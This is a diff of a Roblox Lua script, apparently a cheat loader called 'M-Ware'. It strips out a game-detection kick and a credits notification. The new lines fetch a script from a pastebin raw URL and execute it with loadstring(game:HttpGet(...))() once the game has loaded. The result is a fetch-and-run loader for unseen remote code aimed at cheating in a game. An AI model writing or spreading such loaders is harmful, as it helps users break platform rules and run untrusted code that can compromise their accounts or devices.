@@ -1,20 +1,6 @@
------ Strucid Detector -----
-
-if game.PlaceId == 2377868063 then
-  game.Players.LocalPlayer:Kick("You have been kicked because of ban risks. (Detected by SpeedSterKawaii's Detector)")
-  else
-  wait(0.1)
+if game:IsLoaded() then
+	loadstring(game:HttpGet("https://pastebin.com/raw/mwLpfH0f", true))()
+else
+	game.Loaded:Wait()
+	loadstring(game:HttpGet("https://pastebin.com/raw/mwLpfH0f", true))()
 end
-
------ End Strucid Detector -----
-
------ Watermark hehe -----
-
-game.StarterGui:SetCore('SendNotification', {
-Title = 'M-Ware';
-Text = 'Made by S1nister and SpeedSterKawaii <3';
-Icon = 'rbxassetid://57254792';
-Duration = 6;
-	});
-
------ End Watermark -----
